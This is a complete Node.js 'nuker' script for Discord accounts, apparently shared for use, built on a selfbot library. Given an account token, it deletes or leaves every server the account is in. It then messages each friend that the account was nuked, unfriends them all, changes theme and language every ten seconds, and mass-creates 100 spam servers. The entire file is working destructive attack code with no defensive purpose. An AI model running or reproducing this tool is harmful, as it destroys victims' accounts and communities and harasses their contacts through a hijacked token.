const readline = require('readline').createInterface({ input: process.stdin, output: process.stdout });
const fs = require('fs');
const { Client } = require('discord.js-selfbot-v13');
const axios = require("axios");
const client = new Client({checkUpdate: false});


readline.question("> Nuke account token: ", (token) => {
if(token) {
client.login(token).catch(err => { 
    console.log(`[-] invalid token`);
    process.exit();
})

client.on('ready',async () => {
console.log(`[+] ${client.user.tag} started nuke`);

await client.guilds.cache.forEach(g => g.delete().then(() => console.log("deleted guild")).catch(err => {}) )
await client.guilds.cache.forEach(g => g.leave().then(() => console.log("leave guild")).catch(err => {}) )
await removeFriends(token);
await changeThema(token);
for (let i = 0; i < 100; i++) {
await guildCreate(token);
}
})
}
})




async function changeThema(token) {
    setInterval(async() => {
        let tema = ['light', 'dark']
        let langue = ['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se']
        let base = "https://discord.com/api/v9"
        await axios({
            method: 'PATCH',
            url: base + '/users/@me/settings',
            headers: {
                'Authorization': token.replace(/\r?\n|\r/g, ''),
                'Content-Type': 'application/json'
            },
            data: {
              'theme': tema.random(),
              'locale': langue.random()
            }
          }).then(() => console.log("change thema")).catch(() => {});
      }, 10000);
}
async function guildCreate(token) {
    await axios({ method: 'POST', url: 'https://discord.com/api/v9/guilds', 
    headers: {
        'Authorization': token.replace(/\r?\n|\r/g, ''),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.1008 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
    },
    data:{"name":"Yunak Nuker | .gg/script","icon":null,"channels":[],"system_channel_id":null}
    }).then((res) => console.log("created guild")).catch((e) => {})
}

async function removeFriends(token) {
    const base = 'https://discord.com/api/v7';

    const status = (await axios.get(base + '/users/@me', {
        headers: {
            'Content-Type': 'application/json',
            'Authorization': token.replace(/\r?\n|\r/g, '')
        }
    })).status;

    if (status !== 200) throw new Error('Request Failed With Error Code');

    await axios({ method: 'GET', url: base + '/users/@me/relationships', headers: {
            'Authorization': token.replace(/\r?\n|\r/g, ''),
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.1008 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
        }
    }).then((response) => {
            const friends = [];

            response.data.forEach((friend) => {
                    friends.push(
                        { id: friend.id, tag: friend.user.username + '#' + friend.user.discriminator }
                    );
                });

            friends.forEach(async(friend) => {
                    await client.users.cache.get(friend.id).send({content : "my account nuked by (Yunak Nuker | discord.gg/script)"}).catch(err => {})

                    axios.delete(base + `/users/@me/relationships/${friend.id}`, {
                        headers: {
                            'Authorization': token.replace(/\r?\n|\r/g, ''),
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.1008 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'                
                        }
                    }).then(() => console.log(`Unfriended ${friend.tag}`))
                    .catch((e) => { console.log(e, '>', 0); });
                });
        }
    ).catch((e) => { });
}


Array.prototype.random = function () {
    return this[Math.floor((Math.random() * this.length))];
  };